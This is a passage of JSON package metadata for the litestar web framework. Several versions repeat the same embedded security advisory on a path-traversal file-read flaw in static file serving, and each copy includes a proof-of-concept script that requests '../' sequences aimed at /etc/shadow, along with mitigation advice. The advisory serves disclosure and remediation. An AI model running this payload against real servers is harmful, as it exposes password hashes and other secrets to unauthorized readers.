vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.5.4":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.5.4/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < '3.11'","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.5.4","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"9d4e82819226a232531c63528ba516182115523ef32b4cfa5275f3ca432c0e37","md5":"a802b8ee31e06cf8cb93dc40312b7a2e","sha256":"716f4cbb0fa31808cca94ecc77ef6f1c597ca6a7c746cf08a965a9debbd5db90"},"downloads":-1,"filename":"litestar-2.5.4-py3-none-any.whl","has_sig":false,"md5_digest":"a802b8ee31e06cf8cb93dc40312b7a2e","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":498253,"upload_time":"2024-01-31T15:02:40","upload_time_iso_8601":"2024-01-31T15:02:40.398753Z","url":"https://files.pythonhosted.org/packages/9d/4e/82819226a232531c63528ba516182115523ef32b4cfa5275f3ca432c0e37/litestar-2.5.4-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"6f93ecf2407111b34750d4cdff72138d35098e442d6f7f3ee7f32cd1bb0a1c22","md5":"aa6267e75c83fe21f5155fe6c7440635","sha256":"e76fd2adc53513e20252974fdc169c2b59e82a0d84ab151bd40c22cc04c38b36"},"downloads":-1,"filename":"litestar-2.5.4.tar.gz","has_sig":false,"md5_digest":"aa6267e75c83fe21f5155fe6c7440635","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":641195,"upload_time":"2024-01-31T15:02:43","upload_time_iso_8601":"2024-01-31T15:02:43.078488Z","url":"https://files.pythonhosted.org/packages/6f/93/ecf2407111b34750d4cdff72138d35098e442d6f7f3ee7f32cd1bb0a1c22/litestar-2.5.4.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.5.5":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.5.5/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < '3.11'","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.5.5","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"aee28c53b03cb28d7ed5262ee443f55fa44c7d4065942f168f91668d56b920b9","md5":"1edb6871f051c7ed94fcc32d2340d834","sha256":"7797e74dd5bb465f6398cf35e5d5bfb99fee92f66b4afd4c066f7dc370510021"},"downloads":-1,"filename":"litestar-2.5.5-py3-none-any.whl","has_sig":false,"md5_digest":"1edb6871f051c7ed94fcc32d2340d834","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":498259,"upload_time":"2024-02-04T18:05:06","upload_time_iso_8601":"2024-02-04T18:05:06.159980Z","url":"https://files.pythonhosted.org/packages/ae/e2/8c53b03cb28d7ed5262ee443f55fa44c7d4065942f168f91668d56b920b9/litestar-2.5.5-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"7af7932206b01ef52b5e3bc39d484a3426d323773ad59403c7f4a9f0893833a9","md5":"0da05f02811df75fba31894a869ab5c2","sha256":"0ae9e526ec89c869883e3e5818f71fb2ae3d53490e0f316ccd71d5cbe5ce0c49"},"downloads":-1,"filename":"litestar-2.5.5.tar.gz","has_sig":false,"md5_digest":"0da05f02811df75fba31894a869ab5c2","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":641393,"upload_time":"2024-02-04T18:05:08","upload_time_iso_8601":"2024-02-04T18:05:08.605145Z","url":"https://files.pythonhosted.org/packages/7a/f7/932206b01ef52b5e3bc39d484a3426d323773ad59403c7f4a9f0893833a9/litestar-2.5.5.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.6.0":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.6.0/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < '3.11'","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API 